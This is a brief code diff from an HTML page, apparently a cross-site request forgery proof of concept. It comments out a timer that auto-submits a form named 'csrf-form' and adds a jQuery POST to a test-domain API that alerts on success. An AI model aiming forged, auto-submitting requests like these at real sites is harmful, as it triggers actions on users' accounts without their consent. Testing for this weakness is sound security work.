@@ -13,13 +13,23 @@
     </form>
  
     <script type='text/javascript'>
-      setTimeout(function(){
-        document.getElementById('csrf-form').submit();
-        sleep(2000);
-      }, 3000)
-      const myfun = function(){
-        document.getElementById('csrf-form').submit();
-      }
+      // setTimeout(function(){
+      //   document.getElementById('csrf-form').submit();
+      //   sleep(2000);
+      // }, 3000)
+      // const myfun = function(){
+      //   document.getElementById('csrf-form').submit();
+      // }
+      function SubForm (){
+      $.ajax({
+          url:'https://tommy-design.test/api/weba/v3/site',
+          type:'post',
+          // data:$('#myForm').serialize(),
+          success:function(){
+              alert("worked");
+          }
+      });
+}
     </script>
   </body>
 
